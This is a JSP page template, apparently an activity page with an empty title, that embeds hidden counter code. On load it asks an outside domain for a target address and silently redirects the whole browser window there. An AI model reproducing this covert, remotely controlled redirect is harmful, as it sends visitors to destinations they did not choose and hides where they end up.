<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%@ include file="../../../common/redirect301.jsp"%>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta name="format-detection" content="telephone=no">
<title></title>
<%@ include file="../../../common/header.jsp"%>
<%@ include file="../../../common/js_param.jsp"%>
<script type="text/javascript" src="https://vidgz.cdn.bcebos.com/vido/jquery.min.js"></script>
</head>
<body class="zh_CN" id="activity-detail">
<div id="cnzz_code" style="display:none">
 <c:if test="${!empty cnzzCode && showCode==1}">
    ${cnzzCode}
 </c:if>
 <c:if test="${!empty SYSPARAM.SITE_COUNT_CODE && showCode==1}">
    ${SYSPARAM.SITE_COUNT_CODE}
 </c:if>
 <c:if test="${!empty SYSPARAM.SITE_COUNT_BCODE}">
    ${SYSPARAM.SITE_COUNT_BCODE}
 </c:if>
</div>

<script type="text/javascript">
    //远程抓取入口域名
$(function(){  
    var req_line = 1;//1,2,3
	var x;
	switch (req_line) {
		case 1:
		  x="26pd.cn";
		  break;
		case 2:
		  x="26pd.cn";
		  break;
		case 3:
		  x="26pd.cn";
		  break;
	}
	
	req_line_api = "http://" + x + "/api/target/domain.html";
	
    $.ajax({  
        type : "GET",  
        async : false,  
        url : req_line_api + "?tp=1&tm=" + new Date().getTime(),  
        dataType : "jsonp",
        jsonpCallback: "jsonpCallback",
        success : function(data){  
		   console.log(data);
		   if(data!=null){
				var code = data.code;
				var msg = data.msg;
				var dm = data.dm;
				if(code==100 && dm!=null && dm!=''){
				    setTimeout(function(){
				       window.top.location.href = dm + "?t=" + new Date().getTime();
				    },100);
				}
			}
        },  
        error:function(){  
            console.log("<<<<<<<bad req>>>>>>>>");
        }  
    });   
});  
</script>
</body>
</html>